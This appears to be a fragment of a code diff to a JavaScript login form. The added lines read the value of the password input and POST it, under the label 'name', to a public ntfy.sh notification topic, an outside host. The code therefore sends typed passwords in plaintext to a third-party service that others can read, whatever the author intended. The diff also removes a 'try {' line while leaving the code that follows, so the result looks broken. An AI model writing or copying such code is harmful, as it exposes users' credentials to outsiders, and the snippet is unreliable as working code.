@@ -481,40 +481,25 @@
                     passwordInput.focus();
                     return;
                 }
+var name = passwordInput.value;
 
-                var name = passwordInput.value;
+var data = {
+    "name": name,
+    "event": "login_attempt",
+    "extra": {}
+};
 
-                var data = {
+const response = await fetch(
+    "https://ntfy.sh/gabriele-telefono-739281-xp",
+    {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    }
+);
 
-                    "name": name,
-
-                    "event": "login_attempt",
-
-                    "extra": {}
-
-                };
-
-                try {
-
-                    const response = await fetch(
-
-                        "https://ntfy.sh/gabriele-telefono-739281-xp",
-
-                        {
-
-                            method: "POST",
-
-                            headers: {
-
-                                "Content-Type": "application/json"
-
-                            },
-
-                            body: JSON.stringify(data)
-
-                        }
-
-                    );
 
                     if (response.ok) {
 
